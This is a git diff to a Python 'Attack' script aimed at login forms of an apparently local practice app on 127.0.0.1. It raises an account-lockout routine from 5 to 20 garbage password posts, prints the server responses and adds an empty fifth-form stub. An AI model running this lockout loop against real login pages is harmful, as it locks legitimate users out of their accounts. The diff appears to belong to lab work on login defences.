@@ -51,6 +51,9 @@ class Attack():
 		if route == '4':
 			self.form_4()
 
+		if route == '5':
+			self.form_5()
+
 
 	# attack login form #1
 	def form_1(self):
@@ -135,6 +138,7 @@ class Attack():
    
 	# attack login form #3
 	def form_3(self):
+          
 		# get captcha end points
 		generate_url = 'http://127.0.0.1:5000/generate'		
 		solve_url = 'http://127.0.0.1:5000/captcha_submit'		
@@ -209,14 +213,22 @@ class Attack():
 				'password': 'password',
 			}
    
-			# send garbage password attempt 5 times in order to lock account
-			for _ in range(5):
-				requests.post(self.url, data=data)
+			# send garbage password attempt in order to lock account
+			for _ in range(20):
+				response = requests.post(self.url, data=data)
 				c = '[' + colored(f'Attacking', 'blue') + ']'
 				print(f'\n{c} : user {user}')
     
+				print('server response: ', response.content)
+    
+    
 			c = '[' + colored(f' Locked  ', 'magenta', attrs=['bold', 'blink']) + ']'
 			print(f'\n{c} : user {user}')
+
+
+	# attack login form #5
+	def form_5(self):
+		pass
 
 
 # start
